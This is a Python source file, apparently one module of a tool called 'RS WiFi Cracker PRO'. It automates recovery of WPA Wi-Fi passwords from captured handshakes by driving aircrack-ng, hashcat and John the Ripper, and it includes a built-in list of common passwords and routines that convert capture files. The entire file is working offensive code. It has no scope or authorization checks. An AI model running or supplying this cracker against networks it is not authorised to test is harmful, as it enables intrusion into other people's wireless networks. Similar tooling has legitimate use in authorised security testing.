#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - Password Cracker Module"""
import os
import re
import time
import subprocess
from typing import Optional, List
from datetime import datetime


class PasswordCracker:
    """WiFi password cracker with multiple backends"""
    
    DEFAULT_WORDLISTS = [
        "/usr/share/wordlists/rs-wordlists/common.txt",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/fasttrack.txt"
    ]
    
    def __init__(self, logger, db=None):
        self.logger = logger
        self.db = db
        self.wordlists = self.DEFAULT_WORDLISTS.copy()
        self.cracked_passwords: dict = {}
    
    def add_wordlist(self, path: str):
        """Add custom wordlist"""
        if os.path.exists(path):
            self.wordlists.insert(0, path)
            self.logger.info(f"Added wordlist: {path}")
        else:
            self.logger.error(f"Wordlist not found: {path}")
    
    def find_wordlist(self) -> Optional[str]:
        """Find available wordlist"""
        for wl in self.wordlists:
            if os.path.exists(wl):
                return wl
        
        # Create default wordlist if none exists
        default_wl = "/usr/share/wordlists/rs-wordlists/common.txt"
        os.makedirs(os.path.dirname(default_wl), exist_ok=True)
        
        if not os.path.exists(default_wl):
            self._generate_default_wordlist(default_wl)
        
        return default_wl
    
    def _generate_default_wordlist(self, output: str):
        """Generate default wordlist"""
        passwords = [
            "12345678", "password", "password123", "admin", "admin123",
            "qwerty", "qwerty123", "letmein", "welcome", "monkey",
            "dragon", "master", "123456789", "1234567890", "password1",
            "abc123", "111111", "baseball", "iloveyou", "trustno1",
            "sunshine", "princess", "welcome1", "shadow", "superman",
            "michael", "football", "passw0rd", "charlie", "donald",
            "password1!", "Password1", "Password123", "P@ssw0rd",
            "qwertyuiop", "12345678910", "letmein123", "welcome123",
            "admin@123", "root", "toor", "kali", "test", "test123"
        ]
        
        with open(output, 'w') as f:
            f.write('\n'.join(passwords))
        
        self.logger.info(f"Generated default wordlist: {output}")
    
    def crack_aircrack(self, cap_file: str, wordlist: str = None, 
                       bssid: str = "", timeout: int = 3600) -> Optional[str]:
        """Crack using aircrack-ng"""
        wordlist = wordlist or self.find_wordlist()
        if not wordlist or not os.path.exists(wordlist):
            self.logger.error("No wordlist found")
            return None
        
        if not os.path.exists(cap_file):
            self.logger.error(f"Capture file not found: {cap_file}")
            return None
        
        self.logger.info(f"Cracking with aircrack-ng...")
        self.logger.info(f"Wordlist: {wordlist}")
        
        cmd = ['aircrack-ng', '-w', wordlist]
        if bssid:
            cmd.extend(['-b', bssid])
        cmd.append(cap_file)
        
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            
            if 'KEY FOUND' in result.stdout:
                match = re.search(r'\[\s*(.+?)\s*\]', result.stdout)
                if match:
                    password = match.group(1).strip()
                    self.logger.success(f"Password found: {password}")
                    self.cracked_passwords[bssid or cap_file] = password
                    if self.db and bssid:
                        self.db.update_handshake_cracked(bssid, password)
                    return password
            
            self.logger.warning("Password not found in wordlist")
            
        except subprocess.TimeoutExpired:
            self.logger.warning("Cracking timeout")
        except Exception as e:
            self.logger.error(f"Cracking failed: {e}")
        
        return None
    
    def crack_hashcat(self, hash_file: str, wordlist: str = None,
                      bssid: str = "", hash_mode: int = 22000) -> Optional[str]:
        """Crack using hashcat (GPU accelerated)"""
        wordlist = wordlist or self.find_wordlist()
        if not wordlist or not os.path.exists(wordlist):
            self.logger.error("No wordlist found")
            return None
        
        self.logger.info("Cracking with hashcat (GPU)...")
        
        # Convert if needed
        if hash_file.endswith('.cap'):
            hash_file = self._convert_cap_to_hashcat(hash_file)
            if not hash_file:
                return None
        
        try:
            # Run hashcat
            cmd = [
                'hashcat', '-m', str(hash_mode),
                hash_file, wordlist,
                '--force', '-O'
            ]
            
            subprocess.run(cmd, capture_output=True, text=True, timeout=7200)
            
            # Show results
            show_result = subprocess.run([
                'hashcat', '-m', str(hash_mode), hash_file, '--show'
            ], capture_output=True, text=True)
            
            if ':' in show_result.stdout:
                lines = show_result.stdout.strip().split('\n')
                for line in lines:
                    if bssid.lower() in line.lower() or not bssid:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            password = parts[-1].strip()
                            if password:
                                self.logger.success(f"Password found: {password}")
                                self.cracked_passwords[bssid or hash_file] = password
                                if self.db and bssid:
                                    self.db.update_handshake_cracked(bssid, password)
                                return password
        except subprocess.TimeoutExpired:
            self.logger.warning("Hashcat timeout")
        except FileNotFoundError:
            self.logger.error("Hashcat not found. Install: apt install hashcat")
        except Exception as e:
            self.logger.error(f"Hashcat failed: {e}")
        
        return None
    
    def _convert_cap_to_hashcat(self, cap_file: str) -> Optional[str]:
        """Convert .cap to hashcat format"""
        try:
            # Try using hcxpcapngtool
            hash_file = cap_file.replace('.cap', '.hc22000')
            result = subprocess.run([
                'hcxpcapngtool', '-o', hash_file, cap_file
            ], capture_output=True, text=True)
            
            if os.path.exists(hash_file):
                return hash_file
        except:
            pass
        
        # Try using aircrack-ng
        try:
            hccapx_file = cap_file.replace('.cap', '.hccapx')
            result = subprocess.run([
                'aircrack-ng', '-J', hccapx_file.replace('.hccapx', ''), cap_file
            ], capture_output=True, text=True)
            
            if os.path.exists(hccapx_file):
                return hccapx_file
        except:
            pass
        
        self.logger.error("Failed to convert capture file for hashcat")
        return None
    
    def crack_john(self, hash_file: str, wordlist: str = None,
                   bssid: str = "") -> Optional[str]:
        """Crack using John the Ripper"""
        wordlist = wordlist or self.find_wordlist()
        
        self.logger.info("Cracking with John the Ripper...")
        
        # Convert if needed
        john_file = hash_file
        if hash_file.endswith('.cap'):
            john_file = hash_file + '.john'
            try:
                result = subprocess.run([
                    '/usr/share/john/wpapcap2john.py', hash_file
                ], capture_output=True, text=True)
                
                with open(john_file, 'w') as f:
                    f.write(result.stdout)
            except FileNotFoundError:
                self.logger.error("John scripts not found")
                return None
        
        try:
            # Run john
            cmd = ['john', f'--wordlist={wordlist}', john_file]
            subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            # Show result
            result = subprocess.run([
                'john', '--show', john_file
            ], capture_output=True, text=True)
            
            if result.stdout and ':' in result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if bssid.lower() in line.lower() or not bssid:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            password = parts[1].strip()
                            if password and len(password) > 1:
                                self.logger.success(f"Password found: {password}")
                                self.cracked_passwords[bssid or hash_file] = password
                                if self.db and bssid:
                                    self.db.update_handshake_cracked(bssid, password)
                                return password
        except subprocess.TimeoutExpired:
            self.logger.warning("John timeout")
        except FileNotFoundError:
            self.logger.error("John not found. Install: apt install john")
        except Exception as e:
            self.logger.error(f"John failed: {e}")
        
        return None
    
    def crack_with_rules(self, cap_file: str, wordlist: str = None,
                         bssid: str = "", rules: str = "best64") -> Optional[str]:
        """Crack with hashcat rules"""
        wordlist = wordlist or self.find_wordlist()
        
        self.logger.info(f"Cracking with {rules} rules...")
        
        hash_file = cap_file
        if cap_file.endswith('.cap'):
            hash_file = self._convert_cap_to_hashcat(cap_file)
        
        if not hash_file:
            return None
        
        try:
            cmd = [
                'hashcat', '-m', '22000',
                hash_file, wordlist,
                '-r', f'/usr/share/hashcat/rules/{rules}.rule',
                '--force'
            ]
            
            subprocess.run(cmd, capture_output=True, text=True, timeout=7200)
            
            show_result = subprocess.run([
                'hashcat', '-m', '22000', hash_file, '--show'
            ], capture_output=True, text=True)
            
            if ':' in show_result.stdout:
                parts = show_result.stdout.strip().split(':')
                if len(parts) >= 2:
                    password = parts[-1].strip()
                    if password:
                        self.logger.success(f"Password found: {password}")
                        return password
        except Exception as e:
            self.logger.error(f"Rule-based cracking failed: {e}")
        
        return None
    
    def benchmark(self) -> dict:
        """Run cracking benchmark"""
        results = {}
        
        # Hashcat benchmark
        try:
            result = subprocess.run(
                ['hashcat', '-b', '--force'],
                capture_output=True, text=True, timeout=60
            )
            if result.returncode == 0:
                results['hashcat'] = 'Available'
            else:
                results['hashcat'] = 'Error'
        except:
            results['hashcat'] = 'Not found'
        
        # John benchmark
        try:
            result = subprocess.run(
                ['john', '--test'],
                capture_output=True, text=True, timeout=60
            )
            results['john'] = 'Available'
        except:
            results['john'] = 'Not found'
        
        # Aircrack benchmark
        try:
            result = subprocess.run(
                ['aircrack-ng', '--help'],
                capture_output=True, text=True
            )
            results['aircrack'] = 'Available'
        except:
            results['aircrack'] = 'Not found'
        
        return results
